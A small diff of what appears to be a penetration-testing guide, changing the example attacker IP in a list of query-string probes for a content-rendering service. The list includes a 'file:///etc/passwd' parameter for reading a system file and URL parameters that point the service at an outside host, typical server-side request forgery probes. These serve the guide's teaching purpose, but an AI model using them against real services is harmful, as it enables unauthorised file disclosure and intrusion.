@@ -486,7 +486,7 @@ If the service generates content, we need to determine how to supply data to it.
 ```text
 ?data=foobar
 ?file=file:///etc/passwd
-?url=http://192.168.118.3/render/url
+?url=http://192.168.45.203/render/url
 ?input=foobar
-?target=http://192.168.118.3/render/target
+?target=http://192.168.45.203/render/target
 ```
